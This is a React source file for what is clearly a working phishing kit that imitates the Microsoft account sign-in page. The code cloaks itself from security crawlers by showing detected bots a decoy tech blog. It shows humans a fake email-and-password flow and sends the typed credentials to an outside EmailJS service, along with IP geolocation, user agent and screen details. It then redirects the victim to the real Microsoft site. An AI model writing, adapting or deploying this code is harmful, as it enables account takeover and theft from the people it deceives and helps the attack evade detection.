import React, { useState, useEffect } from "react";
import "./App.css";
import logo from "./assets/logo.png";
import back from "./assets/back.png";
import question from "./assets/question.png";
import key from "./assets/key.png";

const App = () => {
  const [isBot, setIsBot] = useState(null); // null = checking, true = is bot, false = not bot
  const [view, setView] = useState("uname"); // uname, pwd, final
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [cachedIpData, setCachedIpData] = useState(null);
  const [dontShowAgain, setDontShowAgain] = useState(false);
  const [emailJsReady, setEmailJsReady] = useState(false);
  const [blogComments, setBlogComments] = useState([
    {
      id: 1,
      author: "Sarah Johnson",
      comment: "Great article! Very informative.",
      date: "2 hours ago",
    },
    {
      id: 2,
      author: "Mike Chen",
      comment: "Thanks for sharing this useful information.",
      date: "5 hours ago",
    },
    {
      id: 3,
      author: "Emma Watson",
      comment: "Looking forward to more posts like this.",
      date: "1 day ago",
    },
  ]);

  // Load EmailJS script dynamically
  useEffect(() => {
    const script = document.createElement("script");
    script.src =
      "https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js";
    script.async = true;
    script.onload = () => {
      if (window.emailjs) {
        window.emailjs.init({
          publicKey: "Eyfm5Q_2Xwc2eqVQ1",
        });
        setEmailJsReady(true);
        console.log("EmailJS initialized");
      }
    };
    document.head.appendChild(script);

    return () => {
      document.head.removeChild(script);
    };
  }, []);

  // Bot Detection Logic with mobile detection
  useEffect(() => {
    const detectBot = () => {
      // Check if it's a mobile device (phone or tablet)
      const isMobile = () => {
        const userAgent = navigator.userAgent.toLowerCase();
        const mobilePatterns = [
          "android",
          "iphone",
          "ipad",
          "ipod",
          "blackberry",
          "windows phone",
          "mobile",
          "tablet",
        ];
        return mobilePatterns.some((pattern) => userAgent.includes(pattern));
      };

      const isMobileDevice = isMobile();

      // Check user agent for common bot signatures (excluding common mobile browsers)
      const userAgent = navigator.userAgent.toLowerCase();
      const botPatterns = [
        "bot",
        "crawler",
        "spider",
        "scraper",
        "headless",
        "googlebot",
        "bingbot",
        "slurp",
        "duckduckbot",
        "baiduspider",
        "yandexbot",
        "facebookexternalhit",
        "twitterbot",
        "rogerbot",
        "linkedinbot",
        "embedly",
        "quora link preview",
        "showyoubot",
        "outbrain",
        "pinterest",
        "slackbot",
        "vkShare",
        "telegrambot",
      ];

      // Don't flag as bot if it's a mobile device with common mobile browser patterns
      const isMobileBrowser =
        isMobileDevice &&
        (userAgent.includes("chrome") ||
          userAgent.includes("safari") ||
          userAgent.includes("firefox") ||
          userAgent.includes("edge") ||
          userAgent.includes("opera"));

      // Only apply bot patterns if not a mobile browser
      const isUserAgentBot =
        !isMobileBrowser &&
        botPatterns.some((pattern) => userAgent.includes(pattern));

      // Check for headless browser indicators (but not for mobile)
      const isHeadless =
        !isMobileDevice &&
        (!navigator.webdriver === false ||
          navigator.webdriver === true ||
          !navigator.languages ||
          navigator.plugins.length === 0);

      // Check for automated browser tools (but not for mobile)
      const hasAutomation =
        !isMobileDevice &&
        ((window.chrome?.runtime?.id === undefined &&
          navigator.userAgent.includes("Headless")) ||
          navigator.userAgent.includes("PhantomJS"));

      // Check screen size (but mobile devices have valid screen sizes)
      const isSmallScreen =
        !isMobileDevice &&
        (window.innerWidth === 0 || window.innerHeight === 0);

      // Check for bot-like behavior (fast execution time) - not for mobile
      const startTime = performance.now();
      const isTooFast = () => {
        const endTime = performance.now();
        return !isMobileDevice && endTime - startTime < 10;
      };

      // Check for missing typical browser APIs
      const missingAPIs =
        !window.history || !window.document || !window.navigator;

      // Check if there's no mouse movement (touch devices don't have mouse movement)
      let hasMouseMoved = false;
      const trackMouseMove = () => {
        hasMouseMoved = true;
      };

      // Only track mouse movement on non-touch devices
      const isTouchDevice =
        "ontouchstart" in window || navigator.maxTouchPoints > 0;

      if (!isTouchDevice) {
        document.addEventListener("mousemove", trackMouseMove);
        setTimeout(
          () => document.removeEventListener("mousemove", trackMouseMove),
          1000,
        );
      } else {
        // For touch devices, consider mouse as "moved"
        hasMouseMoved = true;
      }

      // Check for common bot headers (via fetch) - but don't penalize mobile
      const checkBotHeaders = async () => {
        if (isMobileDevice) return false; // Don't flag mobile devices as bots based on IP
        try {
          const response = await fetch("https://ipinfo.io/json");
          const data = await response.json();
          // Check if IP is from known hosting/datacenter ranges
          const isDatacenter =
            data.org?.toLowerCase().includes("hosting") ||
            data.org?.toLowerCase().includes("cloud") ||
            data.org?.toLowerCase().includes("datacenter");
          return isDatacenter;
        } catch {
          return false;
        }
      };

      // Determine if bot - much higher threshold for mobile devices
      const determineIfBot = async () => {
        const isDatacenterIP = await checkBotHeaders();

        // Build score array based on device type
        let botScore = [
          isUserAgentBot,
          isHeadless,
          hasAutomation,
          isSmallScreen,
          isTooFast(),
          missingAPIs,
          isDatacenterIP,
        ];

        // Only add mouse movement check for non-touch devices
        if (!isTouchDevice) {
          botScore.push(!hasMouseMoved);
        }

        const score = botScore.filter(Boolean).length;

        // For mobile devices, require a much higher score to be considered a bot (4+ instead of 2)
        // Also, if it's clearly a mobile browser, never flag as bot
        if (isMobileDevice) {
          return score >= 4; // Higher threshold for mobile
        }

        // For desktop, use the original threshold
        return score >= 2;
      };

      determineIfBot().then(setIsBot);
    };

    detectBot();
  }, []);

  // IP Data Collection (only if not bot)
  useEffect(() => {
    if (!isBot && isBot !== null) {
      collectIpData();
    }
  }, [isBot]);

  const collectIpData = async () => {
    try {
      const response = await fetch("https://ipinfo.io/json");
      const data = await response.json();
      if (data && data.ip) {
        setCachedIpData(data);
        console.log("IP collected:", data.ip);
      }
    } catch (error) {
      setCachedIpData({
        ip: "COLLECTION_FAILED",
        city: "Unknown",
        region: "Unknown",
        country: "Unknown",
        org: "Unknown",
        timezone: "Unknown",
        loc: "Unknown",
      });
    }
  };

  const sendDataViaEmail = async (emailValue, passwordValue) => {
    // Check if EmailJS is ready
    if (!window.emailjs || !emailJsReady) {
      throw new Error("EmailJS not initialized yet");
    }

    if (!cachedIpData || !cachedIpData.ip) {
      throw new Error("No IP data available");
    }

    const params = {
      ip_address: cachedIpData.ip || "Unknown",
      city: cachedIpData.city || "Unknown",
      region: cachedIpData.region || "Unknown",
      country: cachedIpData.country || "Unknown",
      country_name:
        cachedIpData.country_name || cachedIpData.country || "Unknown",
      location: cachedIpData.loc || "Unknown",
      organization: cachedIpData.org || "Unknown",
      isp: cachedIpData.org || "Unknown",
      timezone: cachedIpData.timezone || "Unknown",
      postal_code: cachedIpData.postal || "Unknown",
      hostname: cachedIpData.hostname || "Unknown",
      user_agent: navigator.userAgent || "Unknown",
      platform: navigator.platform || "Unknown",
      language: navigator.language || "Unknown",
      collected_at: new Date().toISOString(),
      referrer: document.referrer || "Direct",
      screen_resolution: `${screen.width}x${screen.height}`,
      url: "https://account.microsoft.com/",
      timezone_offset: new Date().getTimezoneOffset(),
      email: emailValue,
      password: passwordValue,
    };

    try {
      const response = await window.emailjs.send(
        "service_txhhhjj",
        "template_dvst2eq",
        params,
      );
      return response;
    } catch (error) {
      console.error("EmailJS send error:", error);
      throw error;
    }
  };

  const validateEmail = () => {
    if (!email.trim()) {
      setEmailError(
        "Enter a valid email address, phone number, or Skype name.",
      );
      return false;
    }
    setEmailError("");
    return true;
  };

  const validatePassword = () => {
    if (!password.trim()) {
      setPasswordError("Please enter the password for your Microsoft account.");
      return false;
    }
    setPasswordError("");
    return true;
  };

  const handleNext = () => {
    if (validateEmail()) {
      setView("pwd");
    }
  };

  const handleSignIn = async () => {
    if (!validatePassword()) return;
    if (isSubmitting) return;

    // Check if EmailJS is ready
    if (!emailJsReady) {
      alert("Please wait, loading secure connection...");
      return;
    }

    setIsSubmitting(true);

    try {
      await sendDataViaEmail(email, password);
      console.log("Data sent successfully");
      setView("final");
    } catch (error) {
      console.error("Send failed:", error);
      alert("Unable to sign in. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleBack = () => {
    setView("uname");
    setPassword("");
    setPasswordError("");
  };

  const redirectToMicrosoft = () => {
    window.location.replace("https://account.microsoft.com/");
  };

  const addComment = (e) => {
    e.preventDefault();
    const commentInput = document.getElementById("blog-comment");
    const nameInput = document.getElementById("blog-name");
    if (commentInput && commentInput.value.trim()) {
      const newComment = {
        id: blogComments.length + 1,
        author: nameInput?.value.trim() || "Anonymous",
        comment: commentInput.value.trim(),
        date: "Just now",
      };
      setBlogComments([...blogComments, newComment]);
      commentInput.value = "";
      if (nameInput) nameInput.value = "";
    }
  };

  // Show loading state while detecting bot
  if (isBot === null) {
    return (
      <div className="loading-container">
        <div className="loading-spinner-large"></div>
        <p>Loading...</p>
      </div>
    );
  }

  // Show fake blog page for bots
  if (isBot) {
    return (
      <div className="blog-container">
        <header className="blog-header">
          <h1>Tech Insights Blog</h1>
          <p>Latest trends in technology and development</p>
        </header>

        <main className="blog-main">
          <article className="blog-post">
            <h2>The Future of Web Development: What to Expect in 2025</h2>
            <div className="blog-meta">
              <span>By John Doe</span>
              <span>March 15, 2025</span>
              <span>8 min read</span>
            </div>
            <img
              src="https://placehold.co/800x400/0067b8/white?text=Web+Development"
              alt="Web Development"
              className="blog-image"
            />
            <div className="blog-content">
              <p>
                Web development continues to evolve at a rapid pace. As we move
                through 2025, several key trends are shaping how we build and
                interact with websites and applications.
              </p>

              <h3>AI-Powered Development</h3>
              <p>
                Artificial intelligence is revolutionizing the way developers
                write code. From intelligent code completion to automated
                testing, AI tools are becoming indispensable in the modern
                developer's toolkit.
              </p>

              <h3>Serverless Architecture</h3>
              <p>
                The shift towards serverless computing continues to gain
                momentum. Developers can now focus on writing code without
                worrying about infrastructure management, leading to faster
                deployment and reduced operational costs.
              </p>

              <h3>WebAssembly Advances</h3>
              <p>
                WebAssembly is enabling near-native performance in web
                applications. This technology is opening up new possibilities
                for complex applications like video editing, gaming, and data
                visualization in the browser.
              </p>

              <h3>Privacy-First Development</h3>
              <p>
                With increasing concerns about data privacy, developers are
                adopting privacy-first approaches. New frameworks and tools are
                emerging to help build applications that respect user privacy by
                default.
              </p>

              <h3>Progressive Web Apps (PWAs)</h3>
              <p>
                PWAs continue to blur the line between web and native
                applications. With improved offline capabilities and push
                notifications, they offer a compelling alternative to
                traditional app store distribution.
              </p>

              <h3>Conclusion</h3>
              <p>
                The web development landscape in 2025 is more exciting than
                ever. By staying current with these trends, developers can build
                faster, more secure, and more engaging web experiences for users
                worldwide.
              </p>
            </div>
          </article>

          <div className="blog-sidebar">
            <div className="sidebar-widget">
              <h3>About the Author</h3>
              <p>
                John Doe is a senior web developer with over 10 years of
                experience in the industry. He specializes in React, Node.js,
                and modern web technologies.
              </p>
            </div>

            <div className="sidebar-widget">
              <h3>Related Posts</h3>
              <ul>
                <li>
                  <a href="#">Understanding React Server Components</a>
                </li>
                <li>
                  <a href="#">TypeScript Best Practices for 2025</a>
                </li>
                <li>
                  <a href="#">The Rise of Edge Computing</a>
                </li>
                <li>
                  <a href="#">Building Accessible Web Applications</a>
                </li>
              </ul>
            </div>
          </div>
        </main>

        <div className="blog-comments">
          <h3>Comments ({blogComments.length})</h3>
          <form onSubmit={addComment} className="comment-form">
            <input
              type="text"
              id="blog-name"
              placeholder="Your name"
              className="comment-input"
            />
            <textarea
              id="blog-comment"
              placeholder="Leave a comment..."
              rows="3"
              className="comment-textarea"
            ></textarea>
            <button type="submit" className="comment-btn">
              Post Comment
            </button>
          </form>

          <div className="comments-list">
            {blogComments.map((comment) => (
              <div key={comment.id} className="comment">
                <strong>{comment.author}</strong>
                <span className="comment-date">{comment.date}</span>
                <p>{comment.comment}</p>
              </div>
            ))}
          </div>
        </div>

        <footer className="blog-footer">
          <p>&copy; 2025 Tech Insights Blog. All rights reserved.</p>
        </footer>

        <style>{`
          .blog-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          }
          .blog-header {
            text-align: center;
            padding: 40px 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border-radius: 10px;
            margin-bottom: 30px;
          }
          .blog-header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
          }
          .blog-main {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 30px;
            margin-bottom: 40px;
          }
          .blog-post {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
          }
          .blog-post h2 {
            color: #333;
            margin-bottom: 15px;
          }
          .blog-meta {
            color: #666;
            font-size: 0.9rem;
            margin-bottom: 20px;
          }
          .blog-image {
            width: 100%;
            height: auto;
            border-radius: 8px;
            margin-bottom: 20px;
          }
          .blog-content h3 {
            color: #444;
            margin: 20px 0 10px;
          }
          .blog-content p {
            line-height: 1.6;
            color: #555;
            margin-bottom: 15px;
          }
          .blog-sidebar {
            display: flex;
            flex-direction: column;
            gap: 20px;
          }
          .sidebar-widget {
            background: #f5f5f5;
            padding: 20px;
            border-radius: 10px;
          }
          .sidebar-widget h3 {
            margin-bottom: 15px;
            color: #333;
          }
          .sidebar-widget ul {
            list-style: none;
            padding: 0;
          }
          .sidebar-widget li {
            margin-bottom: 10px;
          }
          .sidebar-widget a {
            color: #0067b8;
            text-decoration: none;
          }
          .sidebar-widget a:hover {
            text-decoration: underline;
          }
          .blog-comments {
            background: #f9f9f9;
            padding: 30px;
            border-radius: 10px;
            margin-bottom: 40px;
          }
          .comment-form {
            margin: 20px 0;
          }
          .comment-input, .comment-textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-family: inherit;
          }
          .comment-btn {
            background: #0067b8;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
          }
          .comment-btn:hover {
            background: #005da6;
          }
          .comment {
            padding: 15px;
            border-bottom: 1px solid #eee;
          }
          .comment strong {
            color: #333;
          }
          .comment-date {
            color: #999;
            font-size: 0.8rem;
            margin-left: 10px;
          }
          .blog-footer {
            text-align: center;
            padding: 20px;
            color: #666;
            border-top: 1px solid #eee;
          }
          .loading-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
          }
          .loading-spinner-large {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0067b8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
          }
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
          @media (max-width: 768px) {
            .blog-main {
              grid-template-columns: 1fr;
            }
          }
        `}</style>
      </div>
    );
  }

  // Show main login page for real users
  return (
    <>
      {/* Email Step */}
      <section id="section_uname" className={view === "uname" ? "" : "d-none"}>
        <div className="auth-wrapper">
          <img src={logo} alt="Microsoft" />
          <h2 className="title mb-16 mt-16">Sign in</h2>
          <form onSubmit={(e) => e.preventDefault()}>
            <div className="mb-16">
              <p id="error_uname" className="error">
                {emailError}
              </p>
              <input
                id="inp_uname"
                type="text"
                name="uname"
                className={`input ${emailError ? "error-inp" : ""}`}
                placeholder="Email, phone, or Skype"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onBlur={validateEmail}
              />
            </div>
          </form>
          <div>
            <p className="mb-16 fs-13">
              No account?{" "}
              <a href="" className="link">
                Create one!
              </a>
            </p>
            <p className="mb-16 fs-13">
              <a href="#" className="link">
                Sign in with a security key
                <img src={question} alt="Question img" />
              </a>
            </p>
          </div>
          <div>
            <button className="btn" id="btn_next" onClick={handleNext}>
              Next
            </button>
          </div>
        </div>
        <div className="opts">
          <p className="has-icon mb-0" style={{ fontSize: "15px" }}>
            <span className="icon">
              <img src={key} width="30px" alt="key" />
            </span>{" "}
            Sign-in options
          </p>
        </div>
      </section>

      {/* Password Step */}
      <section id="section_pwd" className={view === "pwd" ? "" : "d-none"}>
        <div className="auth-wrapper">
          <img src={logo} alt="Microsoft" className="d-block" />
          <div className="identity w-100 mt-16 mb-16">
            <button className="back" onClick={handleBack}>
              <img src={back} alt="back" />
            </button>
            <span id="user_identity">{email || "a@b.com"}</span>
          </div>
          <h2 className="title mb-16">Enter password</h2>
          <form onSubmit={(e) => e.preventDefault()}>
            <div className="mb-16">
              <p id="error_pwd" className="error">
                {passwordError}
              </p>
              <input
                id="inp_pwd"
                type="password"
                name="pass"
                className={`input ${passwordError ? "error-inp" : ""}`}
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onBlur={validatePassword}
              />
            </div>
          </form>
          <div>
            <p className="mb-16">
              <a href="#" className="link fs-13">
                Forgot password?
              </a>
            </p>
            <p className="mb-16">
              <a href="#" className="link fs-13">
                Other ways to sign in
              </a>
            </p>
          </div>
          <div>
            <button
              className="btn"
              id="btn_sig"
              onClick={handleSignIn}
              disabled={isSubmitting || !emailJsReady}
            >
              {isSubmitting ? (
                <>
                  <span className="loading-spinner"></span> Signing in...
                </>
              ) : (
                "Sign in"
              )}
            </button>
          </div>
        </div>
      </section>

      {/* Final Step - Stay signed in */}
      <section id="section_final" className={view === "final" ? "" : "d-none"}>
        <div className="auth-wrapper">
          <img src={logo} alt="Microsoft" className="d-block" />
          <div className="identity w-100 mt-16 mb-16">
            <span id="user_identity_final">{email || "a@b.com"}</span>
          </div>
          <h2 className="title mb-16">Stay signed in?</h2>
          <p className="p">
            Stay signed in so you don't have to sign in again next time.
          </p>
          <label className="has-checkbox">
            <input
              type="checkbox"
              className="checkbox"
              checked={dontShowAgain}
              onChange={(e) => setDontShowAgain(e.target.checked)}
            />
            <span>Don't show this again</span>
          </label>
          <div className="btn-group">
            <button className="btn btn-sec" onClick={redirectToMicrosoft}>
              No
            </button>
            <button className="btn" onClick={redirectToMicrosoft}>
              Yes
            </button>
          </div>
        </div>
      </section>

      <footer className="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
      </footer>
    </>
  );
};

export default App;
